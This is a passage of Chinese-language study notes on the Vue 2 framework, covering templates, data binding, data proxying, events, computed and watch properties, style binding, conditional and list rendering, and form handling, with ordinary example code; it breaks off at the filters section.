# Vue核心

## 一 Vue简介

### 1.vue是什么

* 一套用于构建用户界面的渐进式JavaScript框架
  * 渐进式：Vue可以自底向上逐层的应用
  * 简单应用：只需要一个轻量小巧的核心库
  * 复杂应用：可以引入各式各样的Vue插件

### 2.Vue的特点

* 采用组件化模式，提高代码复用率、且让代码更好维护。
* 声明式编码，让编码人员无需直接操作DOM，提高开发效率。
* 使用虚拟DOM+优秀的Diff算法，尽量复用DOM节点。

## 二 hello world

~~~html
<body>
    <!-- 准备一个容器 -->
    <div id="app">
        <h1>{{ title }}</h1>
        <h2>{{ msg }}</h2>
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        //关闭控制台的开发版提示信息
        Vue.config.productionTip = false

        //创建Vue实例
        let vm = new Vue({
            el: '#app',//用于指定当前Vue实例为哪个容器服务，通常为css选择器字符串。这里也可以写 el: document.getElementById('root')
            data: {//data用于存储数据，数据供el指定的容器使用，值可以是一个对象，vue-cli里要写成函数
                title : 'vue !!!',
                msg : 'hello vue !'
            }
        })
    </script>
</body>
~~~

* 一个容器与一个vue实例==一一对应==
  * 如果是类选择器选中两个及以上的容器，只会对第一个管理
* 使用 {{ }} 两对花括号来插入数据
  * 改数据可以是data里的数据，或者其他数据或表达式、函数等等（如 写 1+1 页面显示为2，或者date.now()会显示当前时间）

另一种指定容器的方法（更灵活）

~~~javascript
let vm = new Vue({
        // el: '#app',
        data: {
            title: "shishi",
            msg: 'hello vue'
        }
     })
     vm.$mount('#app')
~~~

另一种data写法（组件式编码里必须使用这种写法）

~~~javascript
 new Vue({
        el: '#app',
        data () {
            return {
                title: "shishi",
                msg: 'hello vue'
            }
        }
    })
~~~

* 这里的this是vue实例
* 如果这里的data函数使用箭头函数，this将变为window（注意！！！）



## 三模板语法

~~~html
<body>
    <div id='app'>
        <h1>插值语法</h1>
        <h2>hello, {{ name }}</h2>
        <h1>指令语法</h1>
        <a v-bind:href="url">点我进行搜索</a>
        <!-- <a :href="url">点我进行搜索</a> -->
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>

        new Vue({
            el: '#app',
            data () {
                return {
                    name: 'shishi',
                    url: 'http://www.baidu.com'
                }
            }
        })
    </script>
</body>
~~~

* 使用 {{  }} 来包含js表达式
* 使用 v-bind：或者简写为 ：来强制绑定内容为js解析表达式



1. 插值语法：
   * 功能：用于解析标签体内容
   * 写法： {{ xxx }}，xxx是js表达式，且可以直接读取到data中的所有属性
2. 指令语法：
   * 功能： 用于解析标签（包括：标签属性、标签体内容、绑定事件...）
   * 使用v-bind：强制绑定，可以简写为 ：，属性值要写js表达式，同样可以读取到data的属性

## 四 数据绑定

~~~html
<body>
    <div id='app'>
        单向数据绑定：
        <input type="text" :value="name">
        <br>
        双向数据绑定：
        <input type="text" v-model ="name">
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>

        new Vue({
            el: '#app',
            data () {
                return {
                   name: 'shishi'
                }
            }
        })
    </script>
</body>
~~~

* v-bind 是单向绑定的，data里的数据会影响input的值，但是改变input的值不会影响data里的值
* v-model 是双向绑定的，其中一方改变都会影响对方
  * 双向绑定一般都应用在表单类元素上（输入类元素）
  * v-model:value 可以简写为 v-model，因为v-model默认收集的是value的值

## 五 MVVM模型

* M：模型（Model）：对应data中的数据
* V：视图（View）：模板
* VM：视图模型（ViewModel）：Vue实例对象

## 六 数据代理

### Object.defineproperty方法

~~~html
<script>
        let dog = {
            name: "hh",
            age: 12
        }
        Object.defineProperty(dog,'num',{
            value: 3
        })
        console.log(dog);//{name: "hh", age: 12, num: 3}

        for(let k in dog){
            console.log(dog[k]);
        }// hh , 12
    </script>
~~~

* Object.defineproperty()能为一个对象添加属性
* 但是该属性默认不会被枚举出来

* 但是可以修改配置是否可以被枚举 enumerable: true

~~~javascript
 Object.defineProperty(dog,'num',{
            value: 3,
            enumerable: true
        })
~~~

* 而且该属性值默认不能被修改

~~~javascript
dog.num = 5//修改不了
~~~

* 同样需要修改一个配置项  writable: true

~~~javascript
Object.defineProperty(dog,'num',{
            value: 3,
            enumerable: true,
            writable: true
        })
~~~

* 同样的，控制属性是否可以被删除 configurable: true

* getter 和sette

~~~javascript
 let number = 22
        let dog = {
            name: "hh",
            age: 12
        }
Object.defineProperty(dog,"num",{
            //当有人读取dog的num属性时候，get函数(俗称getter)会被调用，且返回值是num的值
            get:function(){
                return number
            },
            //同理设置
            set(newValue){//简写
                console.log("修改为"+newValue);
                number = newValue
            }
        })
        number = 13
        dog.num = 59
        console.log(dog);
~~~

### 数据代理？

* ==通过一个对象代理对另一个对象中属性的操作（读/写）==

一个简单的数据代理，操作obj_2来代理obj_1

~~~html
<script>
        let obj_1 = {a:100}
        let obj_2 = {b:200}

        Object.defineProperty(obj_2,'a',{ 
            get(){
                return obj_1.a
            },
            set(value){
                obj_1.a = value
            }
         })
    </script>
~~~

控制输入输出如下

~~~shell
obj_2.a
：100
obj_2.a = 300
：300
obj_1
：{a: 300}
~~~

### vue中的数据代理

~~~html
<body>
    <div id="app">
        <h1>姓名： {{ name }}</h1>
        <h1>地址： {{ address }}</h1>
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        let vm = new Vue({
           el: '#app',
           data: {
               name: 'shishi',
               address: 'xxx 省 xxx 市'
           }
        })
    </script>
</body>
~~~

控制台输入vm打印可以看到很多属性，其中会出现 name 和 address属性，鼠标放在属性值的括号内容上，会出现 提示`Invoke property getter`的提示，就是读取该属性时候调用了getter（data中的对应的属性），同理setter（控制台修改vm的该属性，在vue调试工具里也可以看到data中的属性值也发生了改变，上面的代码也会让页面的数据也发生改变了，或者控制台输入vm.$data或者vm._data），也能看到变化，因为data是存、存储在vm实例中的）。

* vue中将data作为_data添加到了vm实例属性上
* 然后将其中的属性又添加到了vm实例属性上，并且使用getter和setter读取_data中对应属性
* 以上操作就是利用了API: Object.defineproperty()
* 方便了对数据的操作
* 打开_data中除了我们自己写的属性和值，里面还做了一些数据劫持，就是动态的数据和页面数据的相互影响

## 七 事件处理

### 1.简单使用：

~~~html
<body>
    <div id="app">
        <button v-on:click = 'show'>{{ info }}</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        let vm = new Vue({
           el: '#app',
           data: {
                info: '点击我'
           },
           methods: {
               show(event){
                   console.log(this);
                   console.log(this === vm);
                   console.log(event);
               }
           }
        })
    </script>
</body>
~~~

点击之后：控制台输出

~~~shell
Vue {_uid: 0, _isVue: true, $options: {…}, _renderProxy: Proxy, _self: Vue, …}
true
MouseEvent {isTrusted: true, screenX: 46, screenY: 89, clientX: 46, clientY: 16, …}
~~~

* 如果方法使用了箭头函数的话，this将变为Window，建议不适用箭头函数

* click = 那里方法名后不加括号也能被调用，如果要传参数就加括号

* 简写形式  ：  @click（不要写成  :click, :是v-bind的简写，@才是v-on的简写，当什么的时候）

* 如果传参数

~~~html
<body>
    <div id="app">
        <button v-on:click = 'show'>{{ info }}</button>
        <button v-on:click = 'show2(info)'>{{ info }}</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        let vm = new Vue({
           el: '#app',
           data: {
                info: '点击我'
           },
           methods: {
               show(event){
                   console.log(this);
                   console.log(this === vm);
                   console.log(event);
               },
               show2(msg){
                   console.log(msg);
               }
           }
        })
    </script>
</body>
~~~

点击输出 

~~~shell
点击我
~~~

那么 传参数的情况下event呢？

1. 可以直接使用event，不用参数接受

~~~javascript
show2(msg){
       console.log(msg);
       console.log(event);//同样也能获取到
}
~~~

2. 在实参里使用占位符，同样也能接受到

~~~html
<button v-on:click = 'show2(info,$event)'>{{ info }}</button>

show2(msg,event333){
      console.log(msg);
      console.log(event333);
}
~~~

* 注意：这里的两个方法也将出现到vm实例上，但是没有做数据代理（因为没必要，它只是个方法，写啥样，就啥样）

* 所以可以直接写到vm属性上，不用写到methods里

~~~javascript
vm.show2 = function(msg,event333){
                   console.log(msg);
                   console.log(event333);
               }
~~~

* 甚至可以写到data里, 但是这样会让vue给他做数据代理和数据劫持，非常不建议这样写

~~~javascript
data: {
      info: '点击我',
      show2(msg,event333){
      		console.log(msg);
      		 console.log(event333);
        }
},
~~~

### 2.事件修饰符

例子：取消a标签的默认跳转行为

~~~html
<body>
    <div id="app">
        <h1>hello {{ name }}</h1>
        <a href="http://www.baidu.com" @click = "show">百度一下</a>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>

        new Vue({
           el: '#app',
           data: {
               name: 'shishi'
           },
           methods: {
               show(event){
                   alert("hello !!!")
                   event.preventDefault()
               }
           }
        })
    </script>
</body>
~~~

* 这里使用的是event的preventDefault方法来取消事件默认行为
* 但是vue给我们提供了更好的方法，我们可以使用事件修饰符 .prevent

~~~html
<a href="http://www.baidu.com" @click.prevent = "show">百度一下</a>
~~~

vue一共给我们提供了六个事件修饰符

* .prevent: 阻止事件默认行为
* .stop: 阻止事件冒泡
* .once：事件只触发一次
* .capture：使用事件的捕获模式
* .self：只有event.target是当前操作的元素才触发事件
* .passive：事件的默认行为立即执行，无需等待事件回调函数执行完毕
* 时间修饰符可以链式使用，注意链式顺序

### 3.键盘事件

* 使用.enter来表示回车按键

~~~html
<body>
    <div id="app">
        <input type="text" v-model = msg @keyup.enter="show">
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>

        new Vue({
           el: '#app',
           data: {
               msg: 'hh'
           },
           methods: {
               show(){
                   console.log(event.target.value);
               }
           }
        })
    </script>
</body>
~~~

* 一共有九个常用的别名
  * 回车： enter
  * 删除： delete（包括退格键）
  * 退出：esc
  * 空格：space
  * 换行：tab
  * 上：up
  * 下：down
  * 左：left
  * 右：right
* 系统修饰键（比较特殊）：ctrl，alt，shift，meta（win键）
  * keyup：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发
  * keydown：正常触发事件
* 也可以使用keyCode去指定具体的按键（不推荐）
  * 比如 @keyup.enter=== @keyup.13
* 注意给 tab键会让焦点切走，给他绑定事件keyup会出问题，要使用keydown
* 键盘按钮也能链式使用比如  .ctrl.y表示ctrl键和y同时按下

## 八 计算属性

* 先使用methods 来实现

~~~html
<body>
    <div id="app">
        姓：
        <input type="text" v-model = 'firstName'>
        <br>
        名：
        <input type="text" v-model = 'lastName'>
        <br>
        全名：<span>{{ name() }}</span>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
       new Vue({
          el: '#app',
          data () {
             return {
                 firstName : 'd',
                 lastName: 'g'
             }
          },
          methods: {
              name(){
                  return this.firstName.slice(0,2) + this.lastName.slice(0,3)
              }
          }
       })
    </script>
</body>
~~~

* 注意这里的{{}}里name要加（），不加表示页面要显示这个函数，而我们应该是调用这个函数
* 只要data中的数据发生改变，vue就会重新解析一边，插值语法里的方法也会被重新调用一遍
* 直接在{{}}写返回语句的表达式也行

* 计算属性实现 computed

~~~html
<body>
    <div id="app">
        姓：
        <input type="text" v-model = 'firstName'>
        <br>
        名：
        <input type="text" v-model = 'lastName'>
        <br>
        全名：<span>{{ name }}</span>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
       let vm = new Vue({
          el: '#app',
          data () {
             return {
                 firstName : 'd',
                 lastName: 'g'
             }
          },
          computed: {
              name: {
                  get(){
                      return this.firstName + this.lastName
                  },
              }
          }
       })
    </script>
</body>
~~~

* 控制打印vm发现name出现在vm上
* 但是 name 没有出现在vm._data中，因为name是作为计算属性被计算出来的，之后被放到vm上
* 而且计算属性的this被vue调整为了vm
* 而且计算属性有缓存，如果这样写，get只被调用了一次

~~~html
全名：<span>{{ name }}</span>
全名：<span>{{ name }}</span>
全名：<span>{{ name }}</span>
全名：<span>{{ name }}</span>
~~~

* get什么时候被调用？
  1. 初次调用该属性时
  2. 所依赖的数据发生改变时候（为了保证数据的对应更新）
* set方法不是必须写的，除非有需求，set只有在该属性被修改时候才调用

* 当确定该属性只读不改时，可以使用简写

~~~html
<body>
    <div id="app">
        姓：
        <input type="text" v-model = 'firstName'>
        <br>
        名：
        <input type="text" v-model = 'lastName'>
        <br>
        全名：<span>{{ name }}</span>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
       let vm = new Vue({
          el: '#app',
          data () {
             return {
                 firstName : 'd',
                 lastName: 'g'
             }
          },
          computed: {
              name () { 
                  return this.firstName+this.lastName
               }
          }
       })
    </script>
</body>
~~~

* 注意{{}}里不要加（），它是计算属性，虽然写成了函数，他只是get函数，返回的值以name作为名字属性保存到vm上

## 九监视属性

~~~html
<body>
    <div id="app">
        <h1>今天的温度：{{value}}°</h1>
        <h2>今天的天气： {{info}}</h2>
        <button @click='upT'>更新温度</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  value: 29
              }
           },
           computed: {
               info(){
                   return (this.value > 23) ?  "炎热":  '寒冷'
               }
           },
           methods: {
               upT(){
                   this.value = parseInt(Math.random()*35)
               }
           },
           watch: {
               value:{
                   //当value发生改变时候，handler会被调用
                   handler(newValue, oldValue){
                        console.log('value 被修改了');
                        console.log("原来的值：",oldValue);
                        console.log("新的值：  ",newValue);
                   }
               }
           }
        })
    </script>
</body>
~~~

* watch监视属性

  * 当被监视的属性的属性值发生改变时候，配置的handler函数被调用，并且可以接受到两个参数，新值和旧值

  * 监视属性也可以监视计算属性（计算属性也是属性）

  * 还有一些其他的配置，例如immediate

  * ~~~javascript
    watch: {
                   value:{
                       immediate: true,//初始化时候让handler被调用一次
                       //当value发生改变时候，handler会被调用
                       handler(newValue, oldValue){
                            console.log('value 被修改了');
                            console.log("原来的值：",oldValue);
                            console.log("新的值：  ",newValue);
                       }
                   }
               }
    ~~~

* 或者在vm实例上加监视（写在外面）

~~~javascript
vm.$watch('value',{ 
            immediate: true,
            //当value发生改变时候，handler会被调用
            handler(newValue, oldValue){
                 console.log('value 被修改了');
                 console.log("原来的值：",oldValue);
                 console.log("新的值：  ",newValue);
            }
         })
~~~

### 深度监视

### 监视多层次的属性

~~~html
<body>
    <div id="app">
        <h1>a : {{numbers.a}}</h1>
        <button @click='numbers.a++'>a++</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        let vm = new Vue({
           el: '#app',
           data () {
              return {
                  numbers: {
                      a: 1,
                      b: 2
                  }
              }
           },
           watch: {
             'numbers.a' : {
                  handler(){
                    console.log('a 变了');
                  }
              }
           }
        })
    </script>
</body>
~~~

* 注意number.a写成字符串，加上引号，表示一个属性名（即要监视的属性）

* 深度监视：numbers中有变化的监视

~~~html
<body>
    <div id="app">
        <h1>a : {{numbers.a}}</h1>
        <button @click='numbers.a++'>a++</button>
        <h1>b: {{numbers.b}}</h1>
        <button @click='numbers.b++'>b++</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        let vm = new Vue({
           el: '#app',
           data () {
              return {
                  numbers: {
                      a: 1,
                      b: 2
                  }
              }
           },
           watch: {
             numbers: {
                 handler(){
                    console.log('numbers 变了');
                 }
             }
           }
        })
    </script>
</body>
~~~

* 这样写是错误的，因为numbers是复杂数据类型，指针地址是没改变的，a,b变了它的地址是不会变的
* vue默认是会监视到多层次的属性改变的，但是watch默认不检测多层的改变的
* 所以要加深度监视配置deep: true,

~~~javascript
watch: {
     numbers: {
         deep: true,
         handler(){
              console.log('numbers 变了');
         }
     }
}
~~~

### 监视的简写形式

* 如果不需要配置项，只有handler的时候就可以使用简写

~~~javascript
watch: {
     value(newValue,oldValue){
          console.log('value 发生了改变');
          console.log("原来的值：",oldValue);
          console.log("新的值：  ",newValue);
     }
}
~~~

或者(vue管理的函数千万不要用箭头函数)

~~~javascript
 vm.$watch("value", function(newValue,oldValue){
            console.log('value 被修改了');
            console.log("原来的值：",oldValue);
            console.log("新的值：  ",newValue);
        })
~~~

## 十 绑定样式

### class样式绑定---字符串写法

* 适用于样式的类名不确定，需要动态绑定

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .w1{
            width: 100px;
            height: 100px;
        }
        .w2{
            width: 200px;
            height: 200px;
        }
        .w3{
            width: 300px;
            height: 300px;
        }
        .s1{
            
            background: red;
        }
        .s2{
            background: green;
        }
        .s3{
            background: bisque;
        }
    </style>
</head>
<body>
    <div id="app">
        <div @click='change' :class='color +" "+size'>
            这里
        </div>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
               return {
                  size: 'w2',
                  color: 's2'
               }
           },
           methods: {
               change(){
                  this.color = 's3'
                  this.size = 'w3'
               }
           }
        })
    </script>
</body>
</html>
~~~

### 数组类形式

* 就是将类名保存到一个数组里，然后将数组变量放到 ：class后面，适用于类名和个数都不确定

### 对象写法

* 适用于样式个数确定，名字也确定，但是需要动态决定是否启用样式

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .w1{
            width: 100px;
            height: 100px;
        }
        .w2{
            width: 200px;
            height: 200px;
        }
        .w3{
            width: 300px;
            height: 300px;
        }
        .s1{
            
            background: red;
        }
        .s2{
            background: green;
        }
        .s3{
            background: bisque;
        }
    </style>
</head>
<body>
    <div id="app">
        <div @click='change' :class='style'>
            这里
        </div>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
               return {
                  style:{
                      s1: false,
                      s2: false,
                      s3: true,
                      w1: false,
                      w2: false,
                      w3: true
                  }
               }
           },
        })
    </script>
</body>
</html>
~~~

* 为了灵活应用，一般都会将true和false提出变量动态使用
* 也可以将对象直接写在   ：class后面

### style 样式绑定

~~~html
<body>
    <div id="app">
        <div :style='{fontSize : f_size+ "px"}'>
            这里
        </div>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
               return {
                 f_size: 40
               }
           },
        })
    </script>
</body>
~~~

* :style 后面要跟表达式，所以写一个对象配置

* 所以一般这样写

~~~html
<body>
    <div id="app">
        <div :style='obj'>
            这里
        </div>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
               return {
                 obj:{
                     fontSize: '40px',
                    color: 'red'
                 }
               }
           },
        })
    </script>
</body>
~~~

* 也可以使用数组写，数组里的数据是样式对象，与上面这种发生了嵌套，非常不常见的写法

## 十一条件渲染

### v-show

~~~html
<body>
    <div id="app">
        <h1 v-show=isShow>我的名字是：{{ name }}</h1>
        <button @click='isShow = !isShow'>点我 ！！！</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  name: 'shishi',
                  isShow: true
              }
           }
        })
    </script>

</body>
~~~

* v-show会让元素加上一个样式，display：none，也就是说该控件占用的空间会被让出来给其他元素挤上来
* 该元素在html里结构仍然存在

### v-if

~~~html
<body>
    <div id="app">
        <h1 v-if=isShow>我的名字是：{{ name }}</h1>
        <button @click='isShow = !isShow'>点我 ！！！</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  name: 'shishi',
                  isShow: true
              }
           }
        })
    </script>

</body>
~~~

* 会直接在结构里删除掉该元素，打开html结构是看不到的，而v-show是不会删除掉结构的，只是加了dispaly：none的样式

如果需求是频繁切换显示隐藏，建议用v-show，v-if会频繁操作DOM的添加和删除。

* v-else ： 由名可知用法
* v-else-if： 由名可知用法，与if，else if，else 的用法是一样的

~~~html
<body>
    <div id="app">
        <h1 v-if=isShow>我的名字是：{{ name }}</h1>
        <h1 v-else>hhhhhhh</h1>
        <button @click='isShow = !isShow'>点我 ！！！</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  name: 'shishi',
                  isShow: true
              }
           }
        })
    </script>

</body>
~~~

注意多行显示隐藏的用法

* 如果是这样的，这样显得愚蠢

~~~html
<h1 v-if=isShow>我的名字是：{{ name }}</h1>
<h1 v-if=isShow>我的名字是：{{ name }}</h1>
<h1 v-if=isShow>我的名字是：{{ name }}</h1>
~~~

* 优化一下，但是这样会影响页面结构

~~~html
<div v-if=isShow>
            <h1>我的名字是：{{ name }}</h1>
            <h1>我的名字是：{{ name }}</h1>
            <h1>我的名字是：{{ name }}</h1>
</div>
~~~

* 使用模板template，页面渲染时候会将template脱去，但是只能和v-if配合使用，v-show没用

~~~html
<template v-if=isShow>
            <h1>我的名字是：{{ name }}</h1>
            <h1>我的名字是：{{ name }}</h1>
            <h1>我的名字是：{{ name }}</h1>
</template>
~~~

## 十二 列表渲染

* v-for遍历， :key 是必要的，表示每一个遍历的元素的唯一标识
* ul li 这里只是为了让结构清晰，谁加了v-for，就让谁遍历生成
*  v-for="(p,index) in persons" 表示每一个遍历可以接受到两个参数：
  * 每一个遍历的数据
  * 对应的index
  * 如果不需要index，也可以写成 p in persons
  * in 和 of 两个都行：  p of persons

~~~html
<body>
    <div id="app">
        <ul>
            <li v-for="(p,index) in persons" :key="index"> 序号：{{ index }} id：{{ p.id }} 名字：{{ p.name }} 年龄： {{ p.age }}</li>
        </ul>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  persons:[
                      {
                          id: 01,
                          name: 'shishi',
                          age: '12'
                      },
                      {
                          id: 02,
                          name: 'zhan',
                          age: '16'
                      },
                      {
                          id: 03,
                          name: 'geigei',
                          age: '16'
                      }
                  ]
              }
           }
        })
    </script>
</body>
~~~

* 可以遍历数组，也可以遍历对象，注意接受的参数就行了（value， key）键值对
* 甚至可以遍历字符串（本身就是字符数组）
* 可以指定遍历次数，number就是 1-5，index就是0-4

~~~html
<li v-for='(number, index) in 5'>{{number}},{{index}}</li>
~~~

### key的作用和原理

~~~html
<body>
    <div id="app">
        <ul>
           <li v-for="(p,index) in persons" :key="index">
                 {{ index }} ------{{ p.name }} ------{{ p.id }}
                 <input type="text">
            </li>
        </ul>
        <button @click='add'>添加一条数据</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  persons:[
                      {
                          id: 01,
                          name: 'shishi',
                      },
                      {
                          id: 02,
                          name: 'zhan',
                      },
                      {
                          id: 03,
                          name: 'geigei',
                      }
                  ]
              }
           },
           methods: {
               add(){
                    let p = {id: 04,name: 'meimei'}
                    console.log(p);
                    this.persons.unshift(p)
               }
           }
        })
    </script>
</body>
~~~

* 使用index作为 key值

* 点击添加会加在页面数据的最前面，而且可以重复添加
* 使用index作为key问题：
  * 注意每一条数据的input，我们在页面输入数据在里面后，添加数据，input里的数据会往上移动，对齐在新加数据的后面，也就是跟我们的元素对不上了（不写key也会出现这个问题），因为虚拟DOM做新旧对比时候，Key发生变化，input标签是一样的被复用了（因为diff比较的虚拟dom）会跟着key走，文本节点不会是因为对比时候发现变了就更新了（虚拟DOM对比）input输入数据是在真实DOM上，而diff算法对比的是虚拟DOM，所以就错位了
  * 使用index作为key效率会很低
  * 真实DOM上没有key属性，但是虚拟DOM上是有的

### 列表过滤

#### 使用监视属性实现

~~~html
<body>
    <div id="app">
        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>
        <ul>
            <li v-for="(p,index) in filPersons" :key="p.id"> 
                id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}
            </li>
        </ul>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                keyWords: '',
                persons:[
                      {id: 01,name: 'shishi',salary: 1000},
                      {id: 02,name: 'zhan',salary: 3000},
                      {id: 03,name: 'geigei',salary: 5000},
                      {id: 04,name: 'shitt',salary: 9000},
                  ],
                  filPersons: []
              }
           },
           watch: {
               keyWords:{
                   immediate: true,
                   handler(value){
                        this.filPersons = this.persons.filter((p)=>{
                             return p.name.indexOf(value) !== -1
                        })
                   }
               }
           }
        })
    </script>
</body>
~~~

* 一定要加immediate配置，保证页面刚出来的时候有数据

#### 使用计算属性实现

~~~html
<body>
    <div id="app">
        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>
        <ul>
            <li v-for="(p,index) in filPersons" :key="p.id"> 
                id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}
            </li>
        </ul>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                keyWords: '',
                persons:[
                      {id: 01,name: 'shishi',salary: 1000},
                      {id: 02,name: 'zhan',salary: 3000},
                      {id: 03,name: 'geigei',salary: 5000},
                      {id: 04,name: 'shitt',salary: 9000},
                  ],
              }
           },
           computed: {
               filPersons(){
                   return this.persons.filter((p)=>{
                       return p.name.indexOf(this.keyWords) !== -1
                   })
               }
           }
        })
    </script>
</body>
~~~

* 明显对比使用计算属性比较简单方便

### 列表排序

~~~html
<body>
    <div id="app">
        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>
        <button @click='sortType=2'>薪水降序</button>
        <button @click='sortType=1'>薪水升序</button>
        <button @click='sortType=0'>原顺序</button>
        <ul>
            <li v-for="(p,index) in filPersons" :key="p.id"> 
                id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}
            </li>
        </ul>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                keyWords: '',
                sortType: 0,//0 原顺序，1 升序，2 降序
                persons:[
                      {id: 01,name: 'shishi',salary: 1000},
                      {id: 02,name: 'zhan',salary: 3000},
                      {id: 03,name: 'geigei',salary: 5000},
                      {id: 04,name: 'shitt',salary: 9000},
                  ],
              }
           },
           computed: {
               filPersons(){
                   let arr = this.persons.filter((p)=>{
                       return p.name.indexOf(this.keyWords) !== -1
                   })
                   if(this.sortType){
                        arr.sort((a,b)=>{
                            return this.sortType===1 ? a.salary-b.salary : b.salary-a.salary
                        })
                   }
                   return arr
               }
           }
        })
    </script>
</body>
~~~

* 注意计算属性里写的排序和过滤，要保证在过滤后的数据排序才能达到要求

* 所以，计算属性和监视属性都能实现的时候，使用计算属性比较好

## 十三 收集表单数据

~~~html
<body>
    <div id="app">
        <form @submit.prevent='demo'>
            账号：<input type="text" v-model.trim="account"><br><br>
            密码：<input type="password" v-model="pwd"><br><br>
            性别：<br><br>
            男<input type="radio" name="sex" value=0 v-model.number="sex">
            女<input type="radio" name="sex" value=1 v-model.number="sex"><br><br>
            爱好：<br><br>
            抽烟<input type="checkbox" value="抽烟" v-model="hobby">
            喝酒<input type="checkbox" value="喝酒" v-model="hobby">
            烫头<input type="checkbox" value="烫头" v-model="hobby"><br><br>
            所属地址
            <select v-model="city">
                <option value="">请选择地址</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="chengdu">成都</option>
                <option value="shengzheng">深圳</option>
            </select><br><br>
            其他信息：<br><br>
            <textarea cols="30" rows="10" v-model.lazy="otherInfo"></textarea><br><br>
            <input type="checkbox" v-model='isAgree'>阅读并接受用户信息   <a href="http://www.baidu.com">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  account: '',
                  pwd: '',
                  sex: 0,
                  hobby: [],
                  city: '',
                  otherInfo: '',
                  isAgree: false
              }
           },
           methods: {
               demo(){
                   console.log("用户信息");
                   //1.这样可以，但是不建议直接访问_data
                   console.log(JSON.stringify(this._data));
                    //2.封装用户对象,或者在data里就写成对象的形式
                    console.log('ajax');
               }
           }
        })
    </script>
</body>
~~~

* radio和checkbox要自己配置value值，如果不配置默认收集checked状态（boolean）

  * checkbox收集的数据要初始化为数组，才会是想要的效果，不然仍然是收集checked状态

  * ~~~javascript
    data () {
                  return {
                      account: '',
                      pwd: '',
                      sex: 0,
                      hobby: []
                  }

* v-model 也可以加修饰符，不然输入的东西会被默认为字符

  * ~~~html
    性别：<br><br>
    男<input type="radio" name="sex" value=0 v-model.number="sex">
    女<input type="radio" name="sex" value=1 v-model.number="sex"><br><br>
    ~~~

  * 其他修饰符

    * .lazy 当焦点移出去才会收集

    * ~~~html
      其他信息：<br><br>
      <textarea cols="30" rows="10" v-model.lazy="otherInfo"></textarea><br><br>
      ~~~

    * .trim 去掉前后空格

    * ~~~html
       账号：<input type="text" v-model.trim="account"><br><br>
      ~~~

* 一般现在都不让表单默认提交并刷新页面，而只是将表单作为结构使用

* ~~~html
  <form @submit.prevent='demo'>
  ~~~

## 十四 过滤器

* 例子：转化时间戳
* 自己使用第三方库转化
* npm i dayjs
* 1. 使用计算属性实现

~~~html
<body>
    <div id="app">
        <h1>时间： {{ fTime }}</h1>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script src="../node_modules/dayjs/dayjs.min.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  time: Date.now()
              }
           },
           computed: {
               fTime(){
                //    return dayjs(this.time)
                   return dayjs(this.time).format('YY-MM-DD: mm-ss')
               }
           }
        })
    </script>
</body>
~~~

* 2. 使用过滤器实现
* 加配置项filters：{}
* 在属性后面加管道符 |  加过滤器   {{ time | timeFormater }}
* 自定义过滤器，返回值将作为页面要显示的东西
* 而且vue自己将参数传了进去，只用接收直接用就行

~~~html
<body>
    <div id="app">
        <!-- <h1>时间： {{ fTime }}</h1> -->
